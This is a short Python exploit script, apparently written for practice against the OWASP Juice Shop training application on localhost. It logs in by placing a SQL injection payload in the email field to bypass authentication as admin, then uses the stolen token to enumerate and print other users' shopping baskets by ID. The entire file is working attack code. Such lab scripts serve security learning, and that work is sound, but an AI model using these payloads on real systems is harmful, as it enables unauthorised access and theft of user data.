import requests

if __name__ == '__main__':
    # Create a session
    session = requests.Session()

    # Set the headers
    headers = {
        'Host': 'localhost:3000',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    # Set the data
    data = {
        "email":"admin@juice-sh.op\' or 1=1 -- -",
        "password":"ffff"
    }

    # Make the Login POST request
    url = 'http://localhost:3000/rest/user/login' 
    response = session.post(url, headers=headers, data=data, proxies=proxies, verify=False)

    json_response = response.json()
    token = json_response['authentication']['token']    


    # Set the headers

    headers['Authorization'] = f'Bearer {token}'

    # URL template
    url_template = 'http://localhost:3000/rest/basket/{}'

    # Iterate over a range of IDs (for example, 1 to 10)
    for i in range(1, 11):
        # Format the URL with the current ID
        url = url_template.format(i)
        
        # Make the GET request
        response = session.get(url, headers=headers, proxies=proxies, verify=False)

        data = response.json()['data']

        if data != None:   
            # Print the response
            print(f'Response for ID {i}:\n{data}\n')